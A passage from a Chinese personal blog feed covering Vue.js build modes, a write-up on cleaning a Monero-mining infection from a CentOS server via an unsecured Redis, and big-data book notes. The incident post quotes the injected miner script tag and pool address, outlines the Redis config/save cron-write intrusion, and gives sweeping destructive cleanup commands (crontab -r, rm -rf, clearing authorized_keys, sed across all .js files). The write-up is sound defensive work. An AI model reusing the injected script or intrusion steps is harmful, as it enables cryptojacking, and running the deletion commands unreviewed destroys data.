    info: &lt;span style=&quot;color: #E6DB74;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  },
  template: &lt;span style=&quot;color: #E6DB74;&quot;&gt;'&amp;lt;div&amp;gt;&amp;#36825;&amp;#26159;template&amp;#23646;&amp;#24615;&amp;#27169;&amp;#26495;&amp;#28210;&amp;#26579;&amp;#12290;&amp;lt;/div&amp;gt;'&lt;/span&gt;
})
&lt;span style=&quot;color: #F92672;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #E6DB74;&quot;&gt;'.vapp-3'&lt;/span&gt;,
  data: {
    info: &lt;span style=&quot;color: #E6DB74;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  }
})
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org85c8b81&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org85c8b81&quot;&gt;独立构建和运行时构建&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org85c8b81&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;背景说明
&lt;br /&gt;
Vue.js 1.0，编译器需要依赖浏览器的DOM，所以无法将编译器和运行时分开。因此在Vue.js 1.0分发包中，编译器和运行时是打包在一起，都在浏览器端执行。
&lt;br /&gt;
Vue.js 2.0，为了支持服务端渲染(server-side rendering)，编译器不能依赖浏览器的DOM，所以必须将编译器和运行时分开。于是形成了独立构建（编译器 + 运行时）和运行时构建（仅运行时）。显而易见，运行时构建体积要小于独立构建。&lt;/li&gt;

&lt;li&gt;模板编译器
&lt;br /&gt;
模板编译器的职责是将模板字符串编译为纯JavaScript的渲染函数，即将&amp;lt;template&amp;gt;编译成render函数。&lt;/li&gt;

&lt;li&gt;Vue.js的执行过程
&lt;br /&gt;
包含编译过程和运行过程，在编译过程，编译器将字符串模板(template)编译为渲染函数(render)，在运行过程，调用渲染函数。&lt;/li&gt;

&lt;li&gt;&lt;p&gt;
运行时构建
&lt;br /&gt;
运行时构建指不能进行模板编译的Vue库。运行时构建不包含模板编译器，即不支持template选项，如果使用vue-loader和vueify预编译模板，只需要打包运行时，而不需要打包编译器。
&lt;br /&gt;
运行时构建，可以用render选项，但它只在单文件组件中起作用，因为单文件组件的模板是在构建时预编译到render函数中，运行时构建只有独立构建大小的30%，只有16Kb min+gzip大小。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;org673a837&quot;&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#19981;&amp;#38656;&amp;#35201;&amp;#32534;&amp;#35793;&amp;#22120;&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;Vue&lt;/span&gt;({
  render (h) {
    &lt;span style=&quot;color: #F92672;&quot;&gt;return&lt;/span&gt; h(&lt;span style=&quot;color: #E6DB74;&quot;&gt;'div'&lt;/span&gt;, &lt;span style=&quot;color: #AE81FF;&quot;&gt;this&lt;/span&gt;.hello)
  }
})
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;
独立构建
&lt;br /&gt;
独立构建指能够将template模板或者从el挂载元素提取的模板编译成渲染函数的Vue库，独立构建包含模板编译器，可以用template选项实时编译模板。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;org7cdee5e&quot;&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#38656;&amp;#35201;&amp;#32534;&amp;#35793;&amp;#22120;&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;Vue&lt;/span&gt;({
  template: &lt;span style=&quot;color: #E6DB74;&quot;&gt;'&amp;lt;div&amp;gt;&amp;lt;/div&amp;gt;'&lt;/span&gt;
})
&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;
使用vue-cli生成项目时，会提醒使用哪种构建方式，npm包默认导出的是运行时构建，即runtime版本vue.runtime.common.js，如果想使用独立构建，需要在webpack.config.js中配置alias。
&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7cc84a7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org7cc84a7&quot;&gt;renderError&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org7cc84a7&quot;&gt;
&lt;p&gt;
只在开发者环境下工作。
&lt;br /&gt;
当 render 函数遭遇错误时，提供另外一种渲染输出。其错误将会作为第二个参数传递到 renderError。这个功能配合 hot-reload 非常实用。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot;&gt;&lt;span style=&quot;color: #F92672;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;Vue&lt;/span&gt;({
  render (h) {
    &lt;span style=&quot;color: #F92672;&quot;&gt;throw&lt;/span&gt; &lt;span style=&quot;color: #F92672;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #66D9EF;&quot;&gt;Error&lt;/span&gt;(&lt;span style=&quot;color: #E6DB74;&quot;&gt;'oops'&lt;/span&gt;)
  },
  renderError (h, err) {
    &lt;span style=&quot;color: #F92672;&quot;&gt;return&lt;/span&gt; h(&lt;span style=&quot;color: #E6DB74;&quot;&gt;'pre'&lt;/span&gt;, { style: { color: &lt;span style=&quot;color: #E6DB74;&quot;&gt;'red'&lt;/span&gt; }}, err.stack)
  }
}).$mount(&lt;span style=&quot;color: #E6DB74;&quot;&gt;'#app'&lt;/span&gt;)
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Vue" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">XMR 恶意挖矿脚本处理笔记</title><link href="http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/" rel="alternate" type="text/html" title="XMR 恶意挖矿脚本处理笔记" /><published>2018-12-27T00:00:00+08:00</published><updated>2018-12-27T00:00:00+08:00</updated><id>http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0</id><content type="html" xml:base="http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org2e0b2e1&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org2e0b2e1&quot;&gt;事件描述&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org2e0b2e1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org914302c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org914302c&quot;&gt;概况&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org914302c&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
服务器安装系统为 CentOS 7，服务器用户一直采用密钥登录，通过用户登入攻击的可能性几乎为零。
服务器上所有站点使用宝塔面板面板管理，所以可能性是通过攻破了宝塔面板进入，然后注入恶意挖矿脚本的。
网站无法加载，会出现浏览器卡死的情况。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf948ee5&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgf948ee5&quot;&gt;表象&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-orgf948ee5&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
下面陈述被攻击后的表象：
&lt;/pre&gt;

&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;服务器资源被大量占用，资源占用率飙升；&lt;/li&gt;
&lt;li&gt;服务器所有JS文件被篡改，向输出页面增加了一个script标签（document.write('&amp;lt;script src=&quot;&lt;a href=&quot;http://t.cn/EvlonFh&quot;&gt;http://t.cn/EvlonFh&lt;/a&gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;OMINEId(&quot;e02cf4ce91284dab9bc3fc4cc2a65e28&quot;,&quot;-1&quot;)&amp;lt;/script&amp;gt;');）&lt;/li&gt;
&lt;li&gt;网站无法加载，会出现浏览器卡死的情况&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0926d2d&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org0926d2d&quot;&gt;问题排查及解决&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org0926d2d&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc16ccc7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc16ccc7&quot;&gt;排查&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-orgc16ccc7&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 访问服务器上运行的站点（包括宝塔面板），F12，发现不停访问一个wss的地址（wss://xmr.omine.org:8181/），并且很慢。
2. 搜索这个地址，得知此为 XMR 恶意挖矿脚本。
3. 查看系统任务计划，发现定期恶意脚本的计划内容
# crontab -l
4. 由于redis没有安全配置，黑客利用redis安全漏洞入侵了服务器。
攻击者通过redis命令 config set与save完成入侵过程.使用redis-cli -h &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; 登录服务redis-server，
将redis的数据文件改到/var/spool/cron/root文件中，再通save 命令将定时任务shell脚本写入到/var/spool/cron/root 中，
完成定时执行shell脚本，来实现提权及其它操作。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8447931&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org8447931&quot;&gt;解决&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org8447931&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 整理清理脚本
&lt;/pre&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgf2f02e5&quot;&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#20808;&amp;#20851;&amp;#25481;redis&amp;#31471;&amp;#21475;&lt;/span&gt;
iptables -A INPUT -p tcp --dport 6379 -j DROP
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#28165;&amp;#29702;&amp;#23450;&amp;#26102;&amp;#20219;&amp;#21153;&lt;/span&gt;
crontab -r
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#28165;&amp;#38500;redis key Back1 Back3 Back3&lt;/span&gt;
redis-cli -h xxx.xxx.xxx.xxx -x del Back1
redis-cli -h xxx.xxx.xxx.xxx -x del Back2
redis-cli -h xxx.xxx.xxx.xxx -x del Back3
redis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dbfilename dump.rdb
redis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dir /tmp
redis-cli -h xxx.xxx.xxx.xxx -x save
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#28165;&amp;#29702;&amp;#36816;&amp;#34892;&amp;#33050;&amp;#26412;&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #AE81FF; font-weight: bold;&quot;&gt;`ps -ef|grep shz.sh|grep -v grep|awk '{print $2}'`&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #AE81FF; font-weight: bold;&quot;&gt;`ps -ef|grep zigw|grep -v grep|awk '{print $2}'`&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #AE81FF; font-weight: bold;&quot;&gt;`ps -ef|grep cmd|grep -v grep|awk '{print $2}'`&lt;/span&gt;
chattr -i /etc/zigw
chattr -i /etc/shz.sh
chattr -i /tmp/zigw
chattr -i /tmp/shz.sh
rm -rf /etc/shz.sh
rm -rf /etc/gmbpr2
rm -rf /etc/zigw
rm -rf /tmp/zigw
rm -rf /tmp/shz.sh
rm -rf ~/.cmd

&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#28165;&amp;#29702;SSH&amp;#20813;&amp;#30331;&amp;#24405;&amp;#20449;&amp;#24687;&lt;/span&gt;
cat /dev/null&amp;gt; ~/.ssh/authorized_keys
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#28165;&amp;#29702;js&amp;#33050;&amp;#26412;&lt;/span&gt;
find / -name &lt;span style=&quot;color: #E6DB74;&quot;&gt;'*.js'&lt;/span&gt;|xargs grep -L f4ce9|xargs sed -i &lt;span style=&quot;color: #E6DB74;&quot;&gt;'$d'&lt;/span&gt;
mv /usr/bin/get /usr/bin/wget
mv /usr/bin/url /usr/bin/curl
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org504c501&quot;&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #F92672;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;By xzeu&lt;/span&gt;
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;http://www.xzeu.com&lt;/span&gt;
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;Email: admin#xzeu.com&lt;/span&gt;
&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;Filename: clearlink.sh&lt;/span&gt;

&lt;span style=&quot;color: #75715E;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;Begin&lt;/span&gt;
find / -type f -name &lt;span style=&quot;color: #E6DB74;&quot;&gt;'*.js'&lt;/span&gt; |xargs fgrep -s -l &lt;span style=&quot;color: #E6DB74;&quot;&gt;&quot;e02cf4ce91284dab9bc3fc4cc2a65e28&quot;&lt;/span&gt;|xargs ls -l |awk &lt;span style=&quot;color: #E6DB74;&quot;&gt;'{print $9}'&lt;/span&gt;&amp;gt;jsfile.txt
&lt;span style=&quot;color: #F92672;&quot;&gt;for&lt;/span&gt; file&lt;span style=&quot;color: #F92672;&quot;&gt; in&lt;/span&gt; &lt;span style=&quot;color: #AE81FF; font-weight: bold;&quot;&gt;`cat ~/jsfile.txt`&lt;/span&gt;;
&lt;span style=&quot;color: #F92672;&quot;&gt;do&lt;/span&gt;
  &lt;span style=&quot;color: #F92672;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #FD971F;&quot;&gt;file&lt;/span&gt;
  &lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;sed -i '/e02cf4ce91284dab9bc3fc4cc2a65e28/d' $file&lt;/span&gt;
  &lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;cp $file ${file}.bad&lt;/span&gt;
&lt;span style=&quot;color: #F92672;&quot;&gt;done&lt;/span&gt;

&lt;span style=&quot;color: #F92672;&quot;&gt;exit&lt;/span&gt; 0
&lt;span style=&quot;color: #75715E;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;END&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
2. 恢复服务器中的js文件(其中grep的参数为小写的L)
方法一：删除站点所有感染 js 文件，从代码仓库pull，重新上传部署。
方法二：# find / -name '*.js' | xargs grep -l f4ce9 | xargs sed -i '/f4ce9/d'
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org765b1fe&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org765b1fe&quot;&gt;预防&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org765b1fe&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 限制内网访问，或者只限制本机访问
只监听内网的IP，然后在iptables里面限制访问的主机：在/etc/redis/redis.conf中配置如下：
bind 192.168.1.100
如果服务只需要本机访问就直接监听127.0.0.1的回环地址就可以了。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
2. 设置防火墙
如果需要其他机器访问，或者设置了slave模式，那就记得加上相应的防火墙设置，命令如下：
iptables -A INPUT -s 192.168.1.100/32 -p tcp --dport 6379 -j ACCEPT
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
3. 禁止root用户启动redis
使用root权限去运行网络服务是比较有风险的（nginx和apache都是有独立的work用户，而redis没有）。
edis crackit 漏洞就是利用root用户的权限来替换或者增加authorized_keys，来获取root登录权限的。
使用root切换到redis用户启动服务:
useradd -s /sbin/nolog -M redissetsid sudo -u redis /usr/bin/redis-server /etc/redis/redis.conf
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
4. 限制redis文件目录访问权限
设置redis的主目录权限为700,如果redis配置文件独立于redis主目录,权限修过为600,因为redis密码明文存储在配置文件中。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
5. 避免使用熟知的端口,降低被初级扫描的风险
在/etc/redis/redis.conf中配置如下：
找到port 6379这行，把6379改为9999，记得iptables对应的端口要修改
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
6. 开启redis密码认证,并设置高复杂度密码
redis在redis.conf配置文件中，设置配置项requirepass， 开户密码认证。
redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。 
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
7. 禁用或者重命名危险命令
edis crackit漏洞就利用config/save两个命令完成攻击 。 因redis无用户权限限制，建议危险的命令，
使用rename配置项进行禁用或重命名，这样外部不了解重命名规则攻击者，就不能执行这类命令。涉及到的命令：
FLUSHDB, FLUSHALL, KEYS, PEXPIRE, DEL, CONFIG, SHUTDOWN, BGREWRITEAOF, BGSAVE, SAVE, SPOP, SREM, RENAME, DEBUG, EVAL`
以下示例：redis.config文件禁用FLUSHDB、FLUSHALL两个命令；重命名CONFIG、SHUTDOWN命令，添加一个特殊的后缀。
这样redis启动后，只能运行CONFIG_b9fc8327c4dee7命令，不能执行CONFIG命令。
rename-command CONFIG CONFIG_des327c4dee7dfsf
rename-command SHUTDOWN SHUTDOWN_des327c4dee7dfsf
rename-command FLUSHDB &quot;&quot;
rename-command FLUSHALL &quot;&quot;
上述配置将config，flushdb，flushall设置为了空，即禁用该命令，我们也可以命名为一些攻击者难以猜测，
我们自己却容易记住的的名字。保存之后，执行/etc/init.d/redis-server restart 重启生效。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org51c271a&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org51c271a&quot;&gt;参考&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org51c271a&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/Rebybyx/p/9913779.html&quot;&gt;XMR恶意挖矿脚本处理笔记&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/articles/system/186743.html&quot;&gt;XMR恶意挖矿案例简析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.xzeu.com/index.php/archives/120/&quot;&gt;Redis未授权访问缺陷,服务器变矿机&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="比特币" /><category term="恶意挖矿" /><category term="病毒" /><category term="Bitcoin" /><category term="Mining" /><category term="Virus" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">《致胜大数据时代的50种思维方法》</title><link href="http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2018/09/02/big-data/" rel="alternate" type="text/html" title="《致胜大数据时代的50种思维方法》" /><published>2018-09-02T00:00:00+08:00</published><updated>2018-09-02T00:00:00+08:00</updated><id>http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2018/09/02/big-data</id><content type="html" xml:base="http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2018/09/02/big-data/">&lt;p&gt;
致胜大数据时代的50种思维方法
&lt;/p&gt;

&lt;div class=&quot;org-center&quot;&gt;
&lt;p&gt;
If you have questions, please send email to zrg1390556487@gmail.com.
&lt;/p&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-org3734ab5&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org3734ab5&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 前言&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org329e3ea&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org329e3ea&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 什么是大数据&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;最早提出“大数据”时代来临的是全球知名的咨询公司麦肯锡。“数据已经渗透到每一个行业和业务领域，成为重要的组成部分之一。人们对于海量数据的挖掘和运用，预示着新一波生产率增长和消费者盈余浪潮的到来。”&lt;/li&gt;
&lt;li&gt;2008年9月，《自然》杂志推出了封面专栏——“大数据”，内容讲述了数据在生物、物理、工程、数学及社会经济等多方面学科所占据的位置和角色的重要性。&lt;/li&gt;
&lt;li&gt;哈佛大学-社会学教授-加里·金说：“这是一场革命，庞大的数据资源使得各个领域开始了量化进程。无论学术界、商界还是政府，所有领域都将开始这种进程。”&lt;/li&gt;
&lt;li&gt;“大数据”，英文为&quot;Big Dat，，&quot;简单来说，“大数据”是一种巨量资料库，可以在合理时间内达到撷取、管理、处理并整理为帮助公司、企业经营和决策的资讯信息。&lt;/li&gt;
&lt;li&gt;业界将“大数据”概括成四个V，即大量化(Volume)、多样化(Variety)、快速化(Velocity)和价值化(Value)。&lt;/li&gt;
&lt;li&gt;大数据的信息量有多大？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;截止到2012年，数据量已经从TB级别跃升到PB、EB乃至ZB级别。（1024GB=1TB，1024TB=1PB，102**B=1EB，1024EB=1ZB）。&lt;/li&gt;
&lt;li&gt;2008年，全球产生的数据量为0.49ZB；2009年的数据量为0.8ZB；2010年的数据量为1.2ZB；2011年的数据量更是持续增长，竟高达1.82ZB。这个数据量，相当于全世界的每个人产生200GB以上的数据。&lt;/li&gt;
&lt;li&gt;IBM公司称，截止到2013年10月，全世界所获得的数据中，有90%都是过去两年内产生的。预计到2020年时，全世界所产生的数据规模将达到今天的44倍。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;“大数据”不仅是量大而已，它还具有多样化、快速化、价值化等优势。&lt;/li&gt;
&lt;li&gt;截止到2012年10月，大数据所形成的市场规模在51亿美元左右。到了2017年，此数据预计会上涨到530亿美元。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgadccbc9&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgadccbc9&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 改变思维模式，用数据说话&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;来举一个简单的例子：苹果公司创始人史蒂夫·乔布斯在罹患癌症后，不惜花费巨额抽取了全身的DNA信息。这样一来，医生就可以根据他全身的DNA信息来判断癌细胞的变化，从而对症下药。然而，对于普通的患者来说，是拿不出巨额钱款来做这种抽取检测的。换句话说，医生只能从普通患者身上提取很小的一部分DNA信息。两者的治疗效果有多大差异，可想而知。&lt;/li&gt;
&lt;li&gt;再来举个简单的例子：如果你上淘宝，登录支付宝账户，点开电子对账单，你是不是能够看到自己一年的消费曲线图？是不是能够看到每个月的支出和收入？是不是能够看到自己的钱花到哪里去了？是不是比拿笔记账清晰和准确得多？根据网络购物的数据中，你还会发现：哪个城市的男人比女人购买的东西还要多；哪个城市的人用支付宝缴纳水电费的频率最高；什么星座的男性或女性在某年的消费额最高；在一年里，在父母或亲友身上花费了多少；节假日时，什么东西最畅销……&lt;/li&gt;
&lt;li&gt;大数据专家维克托·迈尔-舍恩伯格在《大数据时代》中是这样解释的：云计算在获取海量数据的同时，也带来了数据的混杂性，这会给传统的数据分析带来一些困扰。在以往，我们习惯于由数据得出具体结果。而在大数据时代，我们应当关注的是数据之间的相关关系，而不是数据之间的因果关系。&lt;/li&gt;
&lt;li&gt;数据之间的相关关系可以帮助我们捕捉现在的线索和预测未来。如A和B的情况经常一起发生，那么只要注意到B情况发生，就能预测A的情况是怎么样的。这种“A和B”的关系在零售行业和IT行业中已被广泛运用。7-11便利店通过分析零售终端的数据，得出了这样的一个相关关系—温度低于15摄氏度，暖宝宝的销售量便增加5%。于是，只要温度低于这一度数，7-11便利店内的暖宝宝就会上架；豆瓣电台会推荐一些你可能会喜欢的音乐；当你在当当网买某本书后，系统就会提醒你—购买这本书的人中，有30%也购买了另外一本书……&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org874ac9f&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org874ac9f&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 大数据是一场革命&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge501577&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orge501577&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 定律思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;此前，在大数据中，有两个较为突出的定律：一秒定律或秒级定律和摩尔定律。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;什么叫一秒定律或秒级定律？指的是对处理速度有要求，一般要在秒级时间给出准确的分析结果。&lt;/li&gt;
&lt;li&gt;什么叫摩尔定律？ 指的是简单地评估出半导体技术进展的经验法则，其重要的意义是对于长期来说的，IC制程技术是以一直线的方式向前推展，使得IC产品能持续降低成本，增加功能和提升性能。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据时代，人们更要重视统计学。为什么要强调统计学呢？那是因为人们在认知能力中，统计思维算是最差劲的。要知道，人的大脑中有一些功能比较优良，甚至超过人们自身的想象，比如人们的语言能力。
